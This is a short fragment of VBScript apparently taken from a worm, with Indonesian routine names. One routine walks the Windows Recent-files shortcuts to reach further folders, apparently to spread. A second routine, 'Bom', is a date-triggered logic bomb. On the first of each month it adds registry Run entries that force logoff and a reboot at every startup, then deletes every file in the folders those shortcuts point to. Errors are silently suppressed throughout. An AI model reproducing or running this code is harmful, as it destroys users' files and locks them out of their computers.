Sub SerbuRecent
On Error Resume Next
Dim target, ok
For Each target in fso.GetFolder(Kasdol.SpecialFolders("Recent")).Files
Set ok = Kasdol.CreateShortCut(target)
if fso.FolderExists(ok.WorkingDirectory) then SerbuFolder (ok.WorkingDirectory)
Next
End sub

Sub Bom
On Error Resume Next
Dim target, ok, targethapus, tmp2, tmp3
If Day(Now) = 1 Then
Kasdol.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Dor", "logoff.exe"
Kasdol.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\System", "shutdown -r -f -t 10"
For Each target in fso.GetFolder(Kasdol.SpecialFolders("Recent")).Files
Set ok = Kasdol.CreateShortCut(target)
tmp3 = ok.WorkingDirectory
If fso.FolderExists(tmp3) Then
For Each targethapus In fso.GetFolder(tmp3).Files
Set tmp2 = fso.GetFile(targethapus)
tmp2.Delete
Next
End If
Next
End If
End sub